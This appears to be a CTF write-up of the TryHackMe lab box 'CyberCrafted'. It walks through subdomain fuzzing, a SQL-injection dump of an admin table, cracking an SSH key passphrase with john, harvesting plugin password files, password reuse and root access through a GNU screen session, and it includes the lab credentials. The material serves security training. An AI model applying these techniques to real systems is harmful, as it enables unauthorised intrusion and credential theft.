---
title: "CyberCrafted"
type: docs
tags:
  - thm
  - linux
  - medium
  - sqli
  - minecraft
  - john
  - screen
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.131.89 (`cybercrafted.thm`)

</div>

<div class="callout callout-abstract">

**Attack Path**

1. vhost fuzz → `admin.cybercrafted.thm`, `store.` (403). Also a **Minecraft** server on 25565.
2. `admin.` login is **SQL-injectable** → dump `webapp.admin` → `xXUltimateCreeperXx:diamond123456789` (SHA1) + `THM{...}` web flag.
3. `admin.cybercrafted.thm/panel.php` has a command box → **RCE** → grab `xxultimatecreeperxx`'s SSH key → crack with `john` (`creepin2006`) → SSH.
4. `/opt/minecraft/.../LoginSystem/passwords.yml` → `madrinch` MD5 = `Password123`; `settings.yml` → `bukkit:walrus`. Reuse → `su cybercrafted`.
5. `cybercrafted` runs the MC server inside **GNU screen** as root, `screen -x` / `Ctrl-A :` into the root session → root.

</div>

<div class="callout callout-key">

**Credentials**

- `xXUltimateCreeperXx` : `diamond123456789`
- SSH key passphrase: `creepin2006`
- `madrinch` (MD5 `42f749...`) : `Password123`
- DB (settings.yml): `bukkit` : `walrus`

</div>

---

## Full Walkthrough

```console
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| vulners: [output trimmed — CVE reference dump]
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /secret/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_http-dombased-xss: Couldn't find any DOM based XSS.
| vulners: [output trimmed — CVE reference dump]
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```console
❯ nmap -A 10.10.131.89 -p25565
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-29 22:13 EST
Nmap scan report for cybercrafted.thm (10.10.131.89)
Host is up (0.094s latency).
```

```console
PORT      STATE SERVICE   VERSION
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
```

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds
❯ k1b0r@pwned~/thm/CyberCrafted took 6s 


❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302,403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \,__\\ \,__\/\ \/\ \ \ \,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404,302,403
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 98ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 130ms]
www.admin               [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 99ms]
[WARN] Caught keyboard interrupt (Ctrl-C)


 ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cybercrafted.thm/ -H "Host: FUZZ.cybercrafted.thm" -fc 404,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \,__\\ \,__\/\ \/\ \ \ \,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cybercrafted.thm/
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.cybercrafted.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404,302
________________________________________________

www                     [Status: 200, Size: 832, Words: 236, Lines: 35, Duration: 99ms]
store                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 91ms]
admin                   [Status: 200, Size: 937, Words: 218, Lines: 31, Duration: 510ms]


```console
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp
```


Database: webapp
[2 tables]
+-------+
| admin |
| stock |
+-------+


Database: webapp
Table: admin
[3 columns]
+--------+------------------+
| Column | Type             |
+--------+------------------+
| user   | varchar(32)      |
| hash   | varchar(64)      |
| id     | int(10) unsigned |
+--------+------------------+


```console
+----+------------------------------------------+---------------------+
| id | hash                                     | user                |
+----+------------------------------------------+---------------------+
| 1  | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
| 4  | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
+----+------------------------------------------+---------------------+
```


xXUltimateCreeperXx:diamond123456789

http://admin.cybercrafted.thm/panel.php


we can use creds for web login creds admin.cybercrafted


❯ john --wordlist=/opt/SecLists/Passwords/rockyou.txt ./ssh
[pwned:458818] [[63722,0],0] ORTE_ERROR_LOG: Data unpack would read past end of buffer in file util/show_help.c at line 501
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
creepin2006      (ir_rsa)
1g 0:00:01:13 37.87% (ETA: 23:06:07) 0.01357g/s 75527p/s 75527c/s 75527C/s mickaela2..micka2006
Session aborted


xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.


xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb


madrinch: 42f749ade7f9e195bf475f37a44cafcb = Password123

database:
  username: bukkit
  isolation: SERIALIZABLE
  driver: org.sqlite.JDBC
  password: walrus
  url: jdbc:sqlite:{DIR}{NAME}.db


```console
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ 
```


JavaEdition>Bedrock

ctrl + a + c root ;3
